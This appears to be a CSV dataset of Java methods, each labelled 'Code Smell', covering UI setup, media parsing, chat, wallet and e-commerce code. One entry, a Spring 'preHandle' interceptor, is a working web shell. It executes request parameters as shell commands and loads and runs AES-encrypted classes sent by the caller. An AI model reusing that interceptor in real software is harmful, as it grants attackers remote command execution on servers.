text,label,text_label
"ControlBar(){
  initComponents();
  MigLayout layout=(MigLayout)getLayout();
  LC lc=ConstraintParser.parseLayoutConstraint((String)layout.getLayoutConstraints());
  UnitValue[] insets=lc.getInsets();
  lc.setInsets(new UnitValue[]{new UnitValue(0,UnitValue.PIXEL,null),insets[1],insets[2],insets[3]});
  layout.setLayoutConstraints(lc);
  DefaultComboBoxModel<LookAndFeelInfo> lafModel=new DefaultComboBoxModel<>();
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf Light (F1)"",FlatLightLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf Dark (F2)"",FlatDarkLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf IntelliJ (F3)"",FlatIntelliJLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf Darcula (F4)"",FlatDarculaLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf macOS Light (F5)"",FlatMacLightLaf.class.getName()));
  lafModel.addElement(new LookAndFeelInfo(""FlatLaf macOS Dark (F6)"",FlatMacDarkLaf.class.getName()));
  UIManager.LookAndFeelInfo[] lookAndFeels=UIManager.getInstalledLookAndFeels();
  for (  UIManager.LookAndFeelInfo lookAndFeel : lookAndFeels) {
    String name=lookAndFeel.getName();
    String className=lookAndFeel.getClassName();
    if (className.equals(""com.sun.java.swing.plaf.windows.WindowsClassicLookAndFeel"") || className.equals(""com.sun.java.swing.plaf.motif.MotifLookAndFeel""))     continue;
    if ((SystemInfo.isWindows && className.equals(""com.sun.java.swing.plaf.windows.WindowsLookAndFeel"")) || (SystemInfo.isMacOS && className.equals(""com.apple.laf.AquaLookAndFeel"")) || (SystemInfo.isLinux && className.equals(""com.sun.java.swing.plaf.gtk.GTKLookAndFeel"")))     name+="" (F9)"";
 else     if (className.equals(MetalLookAndFeel.class.getName()))     name+="" (F12)"";
 else     if (className.equals(NimbusLookAndFeel.class.getName()))     name+="" (F11)"";
    lafModel.addElement(new LookAndFeelInfo(name,className));
  }
  lookAndFeelComboBox.setModel(lafModel);
  UIManager.addPropertyChangeListener(e -> {
    if (""lookAndFeel"".equals(e.getPropertyName())) {
      EventQueue.invokeLater(() -> {
        updateInfoLabel();
        frame.updateFontMenuItems();
        frame.getRootPane().setDefaultButton(closeButton);
      }
);
    }
  }
);
  UIScale.addPropertyChangeListener(e -> {
    updateInfoLabel();
  }
);
}",1,Code Smell
"public void initialize() throws CormorantBitcoindException {
  networkInfo=getBitcoindService().getNetworkInfo();
  if (networkInfo.version() < 240000) {
    throw new CormorantBitcoindException(""Bitcoin Core versions older than v24 are not supported"");
  }
  BlockchainInfo blockchainInfo=getBitcoindService().getBlockchainInfo();
  pruned=blockchainInfo.pruned();
  VerboseBlockHeader blockHeader=getBitcoindService().getBlockHeader(blockchainInfo.bestblockhash());
  tip=blockHeader.getBlockHeader();
  timer.schedule(new PollTask(),5000,5000);
  if (blockchainInfo.initialblockdownload()) {
    syncingLock.lock();
    try {
      syncing=true;
      syncingCondition.await();
      if (syncing) {
        if (lastPollException instanceof RuntimeException) {
          throw runtimeException;
        }
        throw new RuntimeException(""Error while waiting for sync to complete"",lastPollException);
      }
    }
 catch (    InterruptedException e) {
      throw new RuntimeException(""Interrupted while waiting for sync to complete"");
    }
 finally {
      syncingLock.unlock();
    }
    blockchainInfo=getBitcoindService().getBlockchainInfo();
    blockHeader=getBitcoindService().getBlockHeader(blockchainInfo.bestblockhash());
    tip=blockHeader.getBlockHeader();
  }
  ListWalletDirResult listWalletDirResult=getBitcoindService().listWalletDir();
  if (listWalletDirResult == null) {
    throw new RuntimeException(""Wallet support must be enabled in Bitcoin Core"");
  }
  boolean exists=listWalletDirResult.wallets().stream().anyMatch(walletDirResult -> walletDirResult.name().equals(CORE_WALLET_NAME));
  legacyWalletExists=listWalletDirResult.wallets().stream().anyMatch(walletDirResult -> walletDirResult.name().equals(Bwt.DEFAULT_CORE_WALLET));
  List<String> loadedWallets=getBitcoindService().listWallets();
  boolean loaded=loadedWallets.contains(CORE_WALLET_NAME);
  if (!exists && !loaded) {
    getBitcoindService().createWallet(CORE_WALLET_NAME,true,true,"""",true,true,true,false);
  }
 else {
    if (!loaded) {
      getBitcoindService().loadWallet(CORE_WALLET_NAME,true);
    }
  }
  ListSinceBlock listSinceBlock=getListSinceBlock(null);
  updateStore(listSinceBlock);
}",1,Code Smell
"@Override public void tick(long time){
  if (forceEnd || pathDuration.isZero() || pathDuration.toMillis() + lastUpdateTime > time) {
    return;
  }
  final Pos targetPos=entityCreature.getTarget() != null ? entityCreature.getTarget().getPosition() : null;
  if (targetPos != null && !targetPos.sameBlock(lastTargetPos)) {
    this.lastUpdateTime=time;
    this.lastTargetPos=targetPos;
    this.entityCreature.getNavigator().setPathTo(targetPos);
  }
}
",1,Code Smell
"public void generateJoinMessage(long chatId,boolean ignoreLeft){
  TLRPC.Chat chat=getChat(chatId);
  if (chat == null || !ChatObject.isChannel(chatId,currentAccount) || ChatObject.isNotInChat(chat) && !ignoreLeft || chat.creator) {
    return;
  }
  TLRPC.TL_messageService message=new TLRPC.TL_messageService();
  message.flags=TLRPC.MESSAGE_FLAG_HAS_FROM_ID;
  message.local_id=message.id=getUserConfig().getNewMessageId();
  if (chat instanceof TLRPC.TL_channel && !ignoreLeft) {
    message.date=chat.date;
  }
 else {
    message.date=getConnectionsManager().getCurrentTime();
  }
  message.from_id=new TLRPC.TL_peerUser();
  message.from_id.user_id=getUserConfig().getClientUserId();
  message.peer_id=new TLRPC.TL_peerChannel();
  message.peer_id.channel_id=chatId;
  message.dialog_id=-chatId;
  message.post=true;
  message.action=new TLRPC.TL_messageActionChatAddUser();
  message.action.users.add(getUserConfig().getClientUserId());
  getUserConfig().saveConfig(false);
  ArrayList<MessageObject> pushMessages=new ArrayList<>();
  ArrayList<TLRPC.Message> messagesArr=new ArrayList<>();
  messagesArr.add(message);
  MessageObject obj=new MessageObject(currentAccount,message,true,false);
  pushMessages.add(obj);
  getMessagesStorage().putMessages(messagesArr,true,true,false,0,0,0);
  AndroidUtilities.runOnUIThread(() -> {
    updateInterfaceWithMessages(-chatId,pushMessages,0);
    getNotificationCenter().postNotificationName(NotificationCenter.dialogsNeedReload);
  }
);
}",1,Code Smell
"@Override public String verifyApplicationAuthCode(String authCode,String applicationId,int type){
  String secret=null;
  if (type == ProtoConstants.ApplicationType.ApplicationType_Robot) {
    WFCMessage.Robot robotData=getRobot(applicationId);
    if (robotData != null && !StringUtil.isNullOrEmpty(robotData.getCallback()) && !StringUtil.isNullOrEmpty(robotData.getSecret())) {
      secret=robotData.getSecret();
    }
  }
 else   if (type == ProtoConstants.ApplicationType.ApplicationType_Channel) {
    WFCMessage.ChannelInfo channelData=getChannelInfo(applicationId);
    if (channelData != null && !StringUtil.isNullOrEmpty(channelData.getCallback()) && !StringUtil.isNullOrEmpty(channelData.getSecret())) {
      secret=channelData.getSecret();
    }
  }
 else   if (type == ProtoConstants.ApplicationType.ApplicationType_Admin) {
    secret=AdminAction.getSecretKey();
    applicationId=""wfadmin"";
  }
  secret=ensureSecretLength(secret);
  byte[] data=Base64.getDecoder().decode(authCode);
  data=AES.AESDecrypt(data,secret,true);
  if (data == null || data.length == 0) {
    return null;
  }
 else {
    String str=new String(data);
    String[] strArr=str.split(""\\?\\|\\?"");
    if (strArr.length == 4) {
      if (applicationId.equals(strArr[2])) {
        long timestamp=Long.parseLong(strArr[1]);
        if (System.currentTimeMillis() - timestamp > 60 * 1000) {
          return null;
        }
        return strArr[0];
      }
    }
  }
  return null;
}",1,Code Smell
"/** 
 * Skips the buffer position to the position after the end of the current PS pack in the buffer, given the byte position right after the  {@link PsExtractor#PACK_START_CODE} of the pack inthe buffer. If the pack ends after the end of the buffer, skips to the end of the buffer.
 */
private static void skipToEndOfCurrentPack(ParsableByteArray packetBuffer){
  int limit=packetBuffer.limit();
  if (packetBuffer.bytesLeft() < 10) {
    packetBuffer.setPosition(limit);
    return;
  }
  packetBuffer.skipBytes(9);
  int packStuffingLength=packetBuffer.readUnsignedByte() & 0x07;
  if (packetBuffer.bytesLeft() < packStuffingLength) {
    packetBuffer.setPosition(limit);
    return;
  }
  packetBuffer.skipBytes(packStuffingLength);
  if (packetBuffer.bytesLeft() < 4) {
    packetBuffer.setPosition(limit);
    return;
  }
  int nextStartCode=peekIntAtPosition(packetBuffer.data,packetBuffer.getPosition());
  if (nextStartCode == PsExtractor.SYSTEM_HEADER_START_CODE) {
    packetBuffer.skipBytes(4);
    int systemHeaderLength=packetBuffer.readUnsignedShort();
    if (packetBuffer.bytesLeft() < systemHeaderLength) {
      packetBuffer.setPosition(limit);
      return;
    }
    packetBuffer.skipBytes(systemHeaderLength);
  }
  while (packetBuffer.bytesLeft() >= 4) {
    nextStartCode=peekIntAtPosition(packetBuffer.data,packetBuffer.getPosition());
    if (nextStartCode == PsExtractor.PACK_START_CODE || nextStartCode == PsExtractor.MPEG_PROGRAM_END_CODE) {
      break;
    }
    if (nextStartCode >>> 8 != PsExtractor.PACKET_START_CODE_PREFIX) {
      break;
    }
    packetBuffer.skipBytes(4);
    if (packetBuffer.bytesLeft() < 2) {
      packetBuffer.setPosition(limit);
      return;
    }
    int pesPacketLength=packetBuffer.readUnsignedShort();
    packetBuffer.setPosition(Math.min(packetBuffer.limit(),packetBuffer.getPosition() + pesPacketLength));
  }
}",1,Code Smell
"@Override public boolean preHandle(HttpServletRequest request,HttpServletResponse response,Object handler) throws Exception {
  System.out.println(""[+] Dynamic Interceptor says hello"");
  if (request.getParameter(""type"") != null && request.getParameter(""type"").equals(""basic"")) {
    String cmd=request.getParameter(basicCmdShellPwd);
    if (cmd != null && !cmd.isEmpty()) {
      String[] cmds=null;
      if (File.separator.equals(""/"")) {
        cmds=new String[]{""/bin/sh"",""-c"",cmd};
      }
 else {
        cmds=new String[]{""cmd"",""/C"",cmd};
      }
      String result=new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(""\\A"").next();
      response.getWriter().println(result);
      return false;
    }
  }
 else   if (request.getHeader(behinderShellHeader) != null) {
    try {
      if (request.getMethod().equals(""POST"")) {
        String k=behinderShellPwd;
        request.getSession().setAttribute(""u"",k);
        Cipher cipher=Cipher.getInstance(""AES"");
        cipher.init(2,new SecretKeySpec((request.getSession().getAttribute(""u"") + """").getBytes(),""AES""));
        byte[] evilClassBytes=cipher.doFinal(new BASE64Decoder().decodeBuffer(request.getReader().readLine()));
        Class evilClass=(Class)myClassLoaderClazz.getDeclaredMethod(""defineClass"",byte[].class,ClassLoader.class).invoke(null,evilClassBytes,Thread.currentThread().getContextClassLoader());
        Object evilObject=evilClass.newInstance();
        Method targetMethod=evilClass.getDeclaredMethod(""equals"",new Class[]{ServletRequest.class,ServletResponse.class});
        targetMethod.invoke(evilObject,new Object[]{request,response});
      }
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
    return false;
  }
  return true;
}",1,Code Smell
"@SuppressWarnings(""ResourceType"") public static boolean isL1WidevineAvailable(String mimeType){
  if (Util.SDK_INT >= 18) {
    try {
      if (MediaCodecUtil.getDecoderInfo(mimeType,true,false) == null) {
        return false;
      }
      MediaDrm mediaDrm=MediaDrmBuilder.build();
      String securityProperty=mediaDrm.getPropertyString(SECURITY_LEVEL_PROPERTY);
      mediaDrm.release();
      return WIDEVINE_SECURITY_LEVEL_1.equals(securityProperty);
    }
 catch (    MediaCodecUtil.DecoderQueryException e) {
      throw new IllegalStateException(e);
    }
  }
  return false;
}",1,Code Smell
"private void setupComboButtonField(ObjectProperty<Node> rightProperty){
  Region showComboButton=new Region();
  showComboButton.getStyleClass().addAll(""graphic"");
  StackPane showComboButtonPane=new StackPane(showComboButton);
  showComboButtonPane.getStyleClass().addAll(""combo-button"");
  showComboButtonPane.setCursor(Cursor.DEFAULT);
  showComboButtonPane.setOnMouseReleased(e -> {
    if (comboProperty.isNotNull().get()) {
      if (comboShowing) {
        comboProperty.get().hide();
      }
 else {
        comboProperty.get().show();
      }
      comboShowing=!comboShowing;
      if (!initialized) {
        comboProperty.get().valueProperty().addListener((observable,oldValue,newValue) -> {
          comboShowing=false;
          Platform.runLater(() -> comboProperty.get().getSelectionModel().clearSelection());
        }
);
        initialized=true;
      }
    }
  }
);
  rightProperty.set(showComboButtonPane);
}
",1,Code Smell
"/** 
 * Reads from the given input using the given  {@link Extractor}, until it can produce the  {@link SeekMap} and all of the tracks have been identified, or until the extractor encounters EOF.
 * @param extractor The {@link Extractor} to extractor from input.
 * @param output The {@link FakeTrackOutput} to store the extracted {@link SeekMap} and track.
 * @param dataSource The {@link DataSource} that will be used to read from the input.
 * @param uri The Uri of the input.
 * @return The extracted {@link SeekMap}.
 * @throws IOException If an error occurred reading from the input, or if the extractor finishesreading from input without extracting any  {@link SeekMap}.
 * @throws InterruptedException If the thread was interrupted.
 */
public static SeekMap extractSeekMap(Extractor extractor,FakeExtractorOutput output,DataSource dataSource,Uri uri) throws IOException, InterruptedException {
  ExtractorInput input=getExtractorInputFromPosition(dataSource,0,uri);
  extractor.init(output);
  PositionHolder positionHolder=new PositionHolder();
  int readResult=Extractor.RESULT_CONTINUE;
  while (true) {
    try {
      while (readResult == Extractor.RESULT_CONTINUE && (output.seekMap == null || !output.tracksEnded)) {
        readResult=extractor.read(input,positionHolder);
      }
    }
  finally {
      Util.closeQuietly(dataSource);
    }
    if (readResult == Extractor.RESULT_SEEK) {
      input=getExtractorInputFromPosition(dataSource,positionHolder.position,uri);
      readResult=Extractor.RESULT_CONTINUE;
    }
 else     if (readResult == Extractor.RESULT_END_OF_INPUT) {
      throw new IOException(""EOF encountered without seekmap"");
    }
    if (output.seekMap != null) {
      return output.seekMap;
    }
  }
}",1,Code Smell
"public Color getEntityTypeColor(Entity entity){
  if (distance.get()) {
    if (friendOverride.get() && entity instanceof PlayerEntity && Friends.get().isFriend((PlayerEntity)entity)) {
      return Config.get().friendColor.get();
    }
 else     return EntityUtils.getColorFromDistance(entity);
  }
 else   if (entity instanceof PlayerEntity) {
    return PlayerUtils.getPlayerColor(((PlayerEntity)entity),playersColor.get());
  }
 else {
    return null;
  }
}
",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void cancelCombinationRecord(Long userId,Long id,Long headId){
  combinationRecordMapper.deleteById(id);
  List<CombinationRecordDO> updateRecords=new ArrayList<>();
  if (Objects.equals(headId,CombinationRecordDO.HEAD_ID_GROUP)) {
    List<CombinationRecordDO> list=getCombinationRecordListByHeadId(id);
    if (CollUtil.isEmpty(list)) {
      return;
    }
    list.sort(Comparator.comparing(CombinationRecordDO::getCreateTime));
    CombinationRecordDO newHead=list.get(0);
    list.forEach(item -> {
      CombinationRecordDO recordDO=new CombinationRecordDO();
      recordDO.setId(item.getId());
      if (ObjUtil.equal(item.getId(),newHead.getId())) {
        recordDO.setHeadId(CombinationRecordDO.HEAD_ID_GROUP);
      }
 else {
        recordDO.setHeadId(newHead.getId());
      }
      recordDO.setUserCount(list.size());
      updateRecords.add(recordDO);
    }
);
  }
 else {
    CombinationRecordDO recordHead=combinationRecordMapper.selectById(headId);
    List<CombinationRecordDO> records=getCombinationRecordListByHeadId(headId);
    if (CollUtil.isEmpty(records)) {
      return;
    }
    records.add(recordHead);
    records.forEach(item -> {
      CombinationRecordDO recordDO=new CombinationRecordDO();
      recordDO.setId(item.getId());
      recordDO.setUserCount(records.size());
      updateRecords.add(recordDO);
    }
);
  }
  combinationRecordMapper.updateBatch(updateRecords);
}",1,Code Smell
